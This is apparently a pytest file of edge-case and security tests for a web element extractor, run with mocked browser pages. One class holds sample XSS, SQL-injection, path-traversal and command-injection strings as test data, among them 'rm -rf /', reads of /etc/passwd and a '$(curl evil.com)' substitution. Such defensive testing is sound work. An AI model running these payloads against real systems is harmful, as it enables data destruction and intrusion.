#!/usr/bin/env python3
"""
EDGE CASE AND SECURITY TESTS FOR ELEMENT EXTRACTOR
==================================================
Tests for edge cases, security vulnerabilities, and robustness.
"""

import asyncio
import json
import pytest
from unittest.mock import AsyncMock, MagicMock, patch
from typing import List, Dict, Any
import tempfile
import time

from element_extractor_no_llm_robust import (
    UltimateElementExtractor,
    ElementData,
    ElementType,
    ExtractionStrategy,
    Platform,
    BoundingBox,
    ExtractionResult,
    MAX_IFRAME_DEPTH,
    MAX_SHADOW_DOM_DEPTH,
    MAX_ELEMENTS_PER_EXTRACTION,
    CACHE_TTL_SECONDS,
)


class TestXSSAndInjectionPrevention:
    """Test XSS and injection attack prevention"""

    @pytest.mark.asyncio
    async def test_xss_in_element_content(self):
        """Test that XSS payloads in content are handled safely"""
        xss_payloads = [
            "<script>alert('XSS')</script>",
            "javascript:alert('XSS')",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>",
            "';alert('XSS');//",
            '"><script>alert("XSS")</script>',
            "<iframe src=javascript:alert('XSS')>",
            "<body onload=alert('XSS')>",
        ]
        
        for payload in xss_payloads:
            element = ElementData(
                element_id="xss_test",
                tag_name="div",
                element_type=ElementType.UNKNOWN,
                text_content=payload,
                inner_html=payload,
            )
            
            # Element should accept the content but handle it safely
            assert element.text_content == payload
            
            # When converted to dict/JSON, should preserve but not execute
            data = element.to_dict()
            assert isinstance(data["text_content"], str)

    @pytest.mark.asyncio
    async def test_sql_injection_in_attributes(self):
        """Test SQL injection payloads in attributes"""
        sql_payloads = [
            "1' OR '1'='1",
            "'; DROP TABLE users; --",
            "1; DELETE FROM users WHERE 1=1",
            "' UNION SELECT * FROM passwords --",
        ]
        
        for payload in sql_payloads:
            element = ElementData(
                element_id="sql_test",
                tag_name="input",
                element_type=ElementType.INPUT,
                attributes={"value": payload, "data-query": payload},
            )
            
            # Should handle SQL payloads as regular strings
            assert element.attributes["value"] == payload

    @pytest.mark.asyncio
    async def test_path_traversal_in_urls(self):
        """Test path traversal attempts in URLs"""
        traversal_payloads = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "file:///etc/passwd",
            "file://c:/windows/system32/config/sam",
        ]
        
        mock_browser = AsyncMock()
        mock_page = AsyncMock()
        mock_page.evaluate = AsyncMock(return_value=[])
        mock_browser.get_page.return_value = mock_page
        
        extractor = UltimateElementExtractor(browser=mock_browser)
        
        for payload in traversal_payloads:
            # Should handle as regular URL without traversal
            result = ExtractionResult(
                url=payload,
                platform=Platform.DESKTOP,
            )
            assert result.url == payload  # Stored as-is, not executed

    @pytest.mark.asyncio
    async def test_command_injection_prevention(self):
        """Test command injection prevention"""
        cmd_payloads = [
            "; ls -la",
            "| cat /etc/passwd",
            "&& rm -rf /",
            "`whoami`",
            "$(curl evil.com)",
        ]
        
        for payload in cmd_payloads:
            element = ElementData(
                element_id="cmd_test",
                tag_name="div",
                element_type=ElementType.UNKNOWN,
                attributes={"onclick": payload},
            )
            
            # Should store but not execute
            assert element.attributes["onclick"] == payload


class TestEdgeCaseWebsites:
    """Test extraction on edge case websites"""

    @pytest.mark.asyncio
    async def test_empty_website(self):
        """Test extraction on completely empty page"""
        mock_browser = AsyncMock()
        mock_page = AsyncMock()
        mock_page.evaluate = AsyncMock(return_value=[])
        mock_page.title = AsyncMock(return_value="")
        mock_page.wait_for_load_state = AsyncMock()
        mock_page.query_selector_all = AsyncMock(return_value=[])
        mock_page.accessibility.snapshot = AsyncMock(return_value=None)
        mock_browser.get_page.return_value = mock_page
        
        extractor = UltimateElementExtractor(browser=mock_browser)
        result = await extractor.extract("https://empty.com")
        
        assert result.total_elements == 0
        assert result.page_title == ""

    @pytest.mark.asyncio
    async def test_404_error_page(self):
        """Test extraction on 404 error page"""
        mock_browser = AsyncMock()
        mock_page = AsyncMock()
        mock_page.evaluate = AsyncMock(return_value=[
            {
                "element_id": "error_404",
                "tag_name": "h1",
                "element_type": "heading",
                "text_content": "404 Not Found",
            }
        ])
        mock_page.title = AsyncMock(return_value="404 Not Found")
        mock_page.wait_for_load_state = AsyncMock()
        mock_browser.get_page.return_value = mock_page
        
        extractor = UltimateElementExtractor(browser=mock_browser)
        result = await extractor.extract("https://notfound.com/missing")
        
        assert result.page_title == "404 Not Found"
        assert len(result.elements) > 0

    @pytest.mark.asyncio
    async def test_500_server_error(self):
        """Test handling of 500 server errors"""
        mock_browser = AsyncMock()
        mock_page = AsyncMock()
        mock_page.evaluate = AsyncMock(side_effect=Exception("500 Internal Server Error"))
        mock_page.wait_for_load_state = AsyncMock()
        mock_browser.get_page.return_value = mock_page
        
        extractor = UltimateElementExtractor(browser=mock_browser)
        
        with pytest.raises(Exception) as exc_info:
            await extractor.extract("https://error500.com")
        
        assert "500" in str(exc_info.value) or "error" in str(exc_info.value).lower()

    @pytest.mark.asyncio
    async def test_extremely_large_page(self):
        """Test extraction on page with 10,000+ elements"""
        mock_browser = AsyncMock()
        mock_page = AsyncMock()
        
        # Generate large number of elements
        large_element_list = [
            {
                "element_id": f"elem_{i}",
                "tag_name": "div",
                "element_type": "unknown",
                "text_content": f"Element {i}",
            }
            for i in range(15000)
        ]
        
        mock_page.evaluate = AsyncMock(return_value=large_element_list)
        mock_page.title = AsyncMock(return_value="Large Page")
        mock_page.wait_for_load_state = AsyncMock()
        mock_page.query_selector_all = AsyncMock(return_value=[])
        mock_browser.get_page.return_value = mock_page
        
        extractor = UltimateElementExtractor(browser=mock_browser)
        result = await extractor.extract("https://huge.com")
        
        # Should handle large pages but may limit elements
        assert result.total_elements > 0
        assert result.total_elements <= 15000

    @pytest.mark.asyncio
    async def test_heavy_javascript_spa(self):
        """Test extraction on heavy JavaScript SPA"""
        mock_browser = AsyncMock()
        mock_page = AsyncMock()
        
        # Simulate dynamic content loading
        call_count = 0
        def dynamic_evaluate(script):
            nonlocal call_count
            call_count += 1
            if "React" in script:
                return ["React", "Redux", "Webpack"]
            elif call_count < 3:
                return []  # Initially empty
            else:
                return [
                    {
                        "element_id": "spa_content",
                        "tag_name": "div",
                        "element_type": "unknown",
                        "text_content": "Dynamically loaded",
                    }
                ]
        
        mock_page.evaluate = AsyncMock(side_effect=dynamic_evaluate)
        mock_page.title = AsyncMock(return_value="SPA App")
        mock_page.wait_for_load_state = AsyncMock()
        mock_page.query_selector_all = AsyncMock(return_value=[])
        mock_browser.get_page.return_value = mock_page
        
        extractor = UltimateElementExtractor(browser=mock_browser)
        result = await extractor.extract("https://spa.com")
        
        assert "React" in result.frameworks_detected
        assert result.has_react is True

    @pytest.mark.asyncio
    async def test_website_behind_authentication(self):
        """Test extraction on authenticated pages"""
        mock_browser = AsyncMock()
        mock_page = AsyncMock()
        
        # Simulate login form
        mock_page.evaluate = AsyncMock(return_value=[
            {
                "element_id": "login_form",
                "tag_name": "form",
                "element_type": "form",
                "attributes": {"action": "/login", "method": "POST"},
            },
            {
                "element_id": "username",
                "tag_name": "input",
                "element_type": "input",
                "attributes": {"type": "text", "name": "username"},
            },
            {
                "element_id": "password",
                "tag_name": "input",
                "element_type": "input",
                "attributes": {"type": "password", "name": "password"},
            },
        ])
        mock_page.title = AsyncMock(return_value="Login Required")
        mock_page.wait_for_load_state = AsyncMock()
        mock_browser.get_page.return_value = mock_page
        
        extractor = UltimateElementExtractor(browser=mock_browser)
        result = await extractor.extract("https://secure.com/dashboard")
        
        # Should extract login form elements
        assert len(result.form_elements) > 0
        assert any(e.input_type == "password" for e in result.elements)


class TestExtremeValues:
    """Test handling of extreme values"""

    def test_extreme_coordinates(self):
        """Test extreme coordinate values"""
        # Very large coordinates
        bbox_large = BoundingBox(
            x=999999999.99,
            y=999999999.99,
            width=999999999.99,
            height=999999999.99,
        )
        assert bbox_large.area > 0
        
        # Very small coordinates
        bbox_small = BoundingBox(
            x=0.0000001,
            y=0.0000001,
            width=0.0000001,
            height=0.0000001,
        )
        assert bbox_small.area > 0
        
        # Zero dimensions (should fail)
        with pytest.raises(Exception):
            BoundingBox(x=0, y=0, width=0, height=0)

    def test_extremely_long_strings(self):
        """Test handling of extremely long strings"""
        # Create a 1MB string
        long_string = "a" * (1024 * 1024)
        
        element = ElementData(
            element_id="long_text",
            tag_name="div",
            element_type=ElementType.UNKNOWN,
            text_content=long_string,
        )
        
        assert len(element.text_content) == 1024 * 1024
        
        # Test truncation in CSV export
        result = ExtractionResult(
            url="https://example.com",
            platform=Platform.DESKTOP,
            elements=[element],
        )
        
        # CSV export should handle long strings
        import tempfile
        with tempfile.NamedTemporaryFile(suffix=".csv", mode="w", delete=False) as f:
            result.export_csv(f.name)

    def test_deeply_nested_structures(self):
        """Test deeply nested DOM structures"""
        # Create deeply nested element hierarchy
        root = ElementData(
            element_id="root",
            tag_name="div",
            element_type=ElementType.UNKNOWN,
            children_ids=[f"child_{i}" for i in range(100)],
        )
        
        # Test iframe depth limit
        deep_iframe = ElementData(
            element_id="deep_iframe",
            tag_name="div",
            element_type=ElementType.UNKNOWN,
            iframe_depth=MAX_IFRAME_DEPTH + 1,
        )
        
        assert deep_iframe.iframe_depth == MAX_IFRAME_DEPTH + 1

    def test_unicode_and_emoji_handling(self):
        """Test Unicode and emoji handling"""
        unicode_strings = [
            "Hello 世界 🌍",
            "مرحبا بالعالم",
            "Здравствуй мир",
            "שלום עולם",
            "🔥💯✨🚀",
            "\u200b\ufeff",  # Zero-width spaces
            "𝕳𝖊𝖑𝖑𝖔",  # Mathematical alphanumeric symbols
        ]
        
        for text in unicode_strings:
            element = ElementData(
                element_id=f"unicode_{hash(text)}",
                tag_name="div",
                element_type=ElementType.UNKNOWN,
                text_content=text,
            )
            
            assert element.text_content == text
            
            # Test JSON serialization
            json_str = json.dumps(element.to_dict(), ensure_ascii=False)
            parsed = json.loads(json_str)
            assert parsed["text_content"] == text


class TestConcurrencyAndRaceConditions:
    """Test concurrent operations and race conditions"""

    @pytest.mark.asyncio
    async def test_concurrent_extractions(self):
        """Test multiple concurrent extractions"""
        mock_browser = AsyncMock()
        mock_page = AsyncMock()
        mock_page.evaluate = AsyncMock(return_value=[])
        mock_page.title = AsyncMock(return_value="Test")
        mock_page.wait_for_load_state = AsyncMock()
        mock_page.query_selector_all = AsyncMock(return_value=[])
        mock_browser.get_page.return_value = mock_page
        
        extractor = UltimateElementExtractor(browser=mock_browser)
        
        # Run multiple extractions concurrently
        urls = [f"https://example{i}.com" for i in range(10)]
        tasks = [extractor.extract(url) for url in urls]
        
        # Should handle concurrent extractions
        results = await asyncio.gather(*tasks, return_exceptions=True)
        
        successful_results = [r for r in results if isinstance(r, ExtractionResult)]
        assert len(successful_results) > 0

    @pytest.mark.asyncio
    async def test_cache_race_conditions(self):
        """Test cache race conditions"""
        from element_extractor_no_llm_robust import MemoryManager
        
        memory_manager = MemoryManager()
        
        async def concurrent_cache_access(key: str, value: str):
            memory_manager.cache_result(key, value)
            await asyncio.sleep(0.001)
            return memory_manager.get_cached(key)
        
        # Run concurrent cache operations
        tasks = [
            concurrent_cache_access(f"key_{i % 5}", f"value_{i}")
            for i in range(20)
        ]
        
        results = await asyncio.gather(*tasks)
        
        # All operations should complete without errors
        assert all(r is not None for r in results)

    @pytest.mark.asyncio
    async def test_strategy_timeout_handling(self):
        """Test strategy timeout handling"""
        mock_page = AsyncMock()
        
        async def slow_evaluate(*args):
            await asyncio.sleep(10)  # Very slow
            return []
        
        mock_page.evaluate = slow_evaluate
        mock_page.query_selector_all = AsyncMock(return_value=[])
        
        from element_extractor_no_llm_robust import DOMExtractionStrategy, MemoryManager
        
        strategy = DOMExtractionStrategy(mock_page, MemoryManager())
        
        # Should timeout and raise exception
        with pytest.raises(Exception):
            await asyncio.wait_for(strategy.extract(), timeout=1)


class TestMemoryAndResourceManagement:
    """Test memory and resource management"""

    @pytest.mark.asyncio
    async def test_memory_cleanup_after_extraction(self):
        """Test memory cleanup after extraction"""
        mock_browser = AsyncMock()
        mock_page = AsyncMock()
        mock_page.evaluate = AsyncMock(return_value=[])
        mock_page.title = AsyncMock(return_value="Test")
        mock_page.wait_for_load_state = AsyncMock()
        mock_browser.get_page.return_value = mock_page
        
        extractor = UltimateElementExtractor(browser=mock_browser)
        
        # Perform extraction
        await extractor.extract("https://example.com")
        
        # Cache some data
        extractor.memory_manager.cache_result("test", "data")
        
        # Close and cleanup
        await extractor.close()
        
        # Memory should be cleared
        assert extractor.memory_manager.get_cached("test") is None

    @pytest.mark.asyncio
    async def test_cache_ttl_expiration(self):
        """Test cache TTL expiration"""
        from element_extractor_no_llm_robust import MemoryManager
        
        memory_manager = MemoryManager()
        
        # Cache with short TTL
        memory_manager.cache_result("expire_test", "data", ttl=0.1)
        
        # Should exist immediately
        assert memory_manager.get_cached("expire_test") == "data"
        
        # Wait for expiration
        await asyncio.sleep(0.2)
        
        # Should be expired
        assert memory_manager.get_cached("expire_test") is None

    def test_large_element_collection_memory(self):
        """Test memory usage with large element collections"""
        # Create large collection
        elements = []
        for i in range(5000):
            elements.append(
                ElementData(
                    element_id=f"elem_{i}",
                    tag_name="div",
                    element_type=ElementType.UNKNOWN,
                    text_content=f"Content {i}" * 10,  # Some content
                    attributes={"data-id": str(i), "class": f"item-{i}"},
                )
            )
        
        result = ExtractionResult(
            url="https://large.com",
            platform=Platform.DESKTOP,
            elements=elements,
        )
        
        # Should handle large collections
        assert result.total_elements == 5000
        
        # Test export doesn't fail
        import tempfile
        with tempfile.NamedTemporaryFile(suffix=".json", delete=False) as f:
            result.export_json(f.name)


class TestErrorRecovery:
    """Test error recovery mechanisms"""

    @pytest.mark.asyncio
    async def test_partial_strategy_failure(self):
        """Test recovery when some strategies fail"""
        mock_browser = AsyncMock()
        mock_page = AsyncMock()
        
        # Some strategies succeed, some fail
        call_count = 0
        def mixed_evaluate(script):
            nonlocal call_count
            call_count += 1
            if call_count % 2 == 0:
                raise Exception("Strategy failure")
            return [{"element_id": f"elem_{call_count}", "tag_name": "div", "element_type": "unknown"}]
        
        mock_page.evaluate = AsyncMock(side_effect=mixed_evaluate)
        mock_page.title = AsyncMock(return_value="Test")
        mock_page.wait_for_load_state = AsyncMock()
        mock_page.query_selector_all = AsyncMock(return_value=[])
        mock_browser.get_page.return_value = mock_page
        
        extractor = UltimateElementExtractor(browser=mock_browser)
        
        # Should recover and return partial results
        result = await extractor.extract("https://partial.com")
        
        # Some elements should be extracted despite failures
        assert len(result.errors) > 0
        # Results depend on which strategies succeed

    @pytest.mark.asyncio
    async def test_network_interruption_recovery(self):
        """Test recovery from network interruptions"""
        mock_browser = AsyncMock()
        mock_page = AsyncMock()
        
        # Simulate network interruption then recovery
        attempts = 0
        def network_simulate(script):
            nonlocal attempts
            attempts += 1
            if attempts < 3:
                raise Exception("Network timeout")
            return []
        
        mock_page.evaluate = AsyncMock(side_effect=network_simulate)
        mock_page.title = AsyncMock(return_value="Test")
        mock_page.wait_for_load_state = AsyncMock()
        mock_browser.get_page.return_value = mock_page
        
        extractor = UltimateElementExtractor(browser=mock_browser)
        
        # Should retry and eventually succeed
        result = await extractor.extract("https://flaky.com")
        
        assert result is not None

    @pytest.mark.asyncio
    async def test_javascript_error_handling(self):
        """Test handling of JavaScript execution errors"""
        mock_browser = AsyncMock()
        mock_page = AsyncMock()
        
        # Simulate JavaScript errors
        mock_page.evaluate = AsyncMock(side_effect=Exception("JavaScript execution error: undefined is not a function"))
        mock_page.wait_for_load_state = AsyncMock()
        mock_browser.get_page.return_value = mock_page
        
        extractor = UltimateElementExtractor(browser=mock_browser)
        
        # Should handle JavaScript errors
        with pytest.raises(Exception) as exc_info:
            await extractor.extract("https://jserror.com")
        
        assert "JavaScript" in str(exc_info.value) or "error" in str(exc_info.value).lower()


class TestCrossBrowserCompatibility:
    """Test cross-browser compatibility scenarios"""

    @pytest.mark.asyncio
    async def test_vendor_prefixed_css(self):
        """Test handling of vendor-prefixed CSS properties"""
        element = ElementData(
            element_id="vendor_css",
            tag_name="div",
            element_type=ElementType.UNKNOWN,
            computed_style={
                "-webkit-transform": "rotate(45deg)",
                "-moz-transform": "rotate(45deg)",
                "-ms-transform": "rotate(45deg)",
                "transform": "rotate(45deg)",
            },
        )
        
        assert element.computed_style is not None

    @pytest.mark.asyncio
    async def test_browser_specific_elements(self):
        """Test browser-specific element handling"""
        # Test various browser-specific elements
        elements = [
            ElementData(
                element_id="marquee",
                tag_name="marquee",  # Deprecated but still found
                element_type=ElementType.UNKNOWN,
            ),
            ElementData(
                element_id="blink",
                tag_name="blink",  # Ancient but might exist
                element_type=ElementType.UNKNOWN,
            ),
            ElementData(
                element_id="details",
                tag_name="details",  # Modern HTML5
                element_type=ElementType.UNKNOWN,
            ),
            ElementData(
                element_id="dialog",
                tag_name="dialog",  # HTML5 dialog
                element_type=ElementType.UNKNOWN,
            ),
        ]
        
        for element in elements:
            assert element.tag_name is not None


class TestDataIntegrity:
    """Test data integrity and consistency"""

    def test_element_id_uniqueness(self):
        """Test element ID uniqueness enforcement"""
        elements = []
        ids_seen = set()
        
        # Create elements ensuring unique IDs
        for i in range(100):
            elem_id = f"elem_{i}"
            if elem_id not in ids_seen:
                elements.append(
                    ElementData(
                        element_id=elem_id,
                        tag_name="div",
                        element_type=ElementType.UNKNOWN,
                    )
                )
                ids_seen.add(elem_id)
        
        assert len(elements) == len(ids_seen)

    def test_parent_child_consistency(self):
        """Test parent-child relationship consistency"""
        parent = ElementData(
            element_id="parent",
            tag_name="div",
            element_type=ElementType.UNKNOWN,
            children_ids=["child1", "child2"],
        )
        
        child1 = ElementData(
            element_id="child1",
            tag_name="span",
            element_type=ElementType.UNKNOWN,
            parent_id="parent",
        )
        
        child2 = ElementData(
            element_id="child2",
            tag_name="span",
            element_type=ElementType.UNKNOWN,
            parent_id="parent",
        )
        
        # Verify relationships
        assert child1.parent_id == parent.element_id
        assert child2.parent_id == parent.element_id
        assert "child1" in parent.children_ids
        assert "child2" in parent.children_ids

    def test_data_type_consistency(self):
        """Test data type consistency across serialization"""
        element = ElementData(
            element_id="test",
            tag_name="div",
            element_type=ElementType.UNKNOWN,
            bounding_box=BoundingBox(x=10, y=20, width=100, height=50),
            is_visible=True,
            iframe_depth=3,
        )
        
        # Serialize and deserialize
        json_data = element.to_dict()
        
        # Check types are preserved
        assert isinstance(json_data["is_visible"], bool)
        assert isinstance(json_data["iframe_depth"], int)
        assert isinstance(json_data["bounding_box"]["x"], (int, float))


if __name__ == "__main__":
    pytest.main([__file__, "-v", "--tb=short"])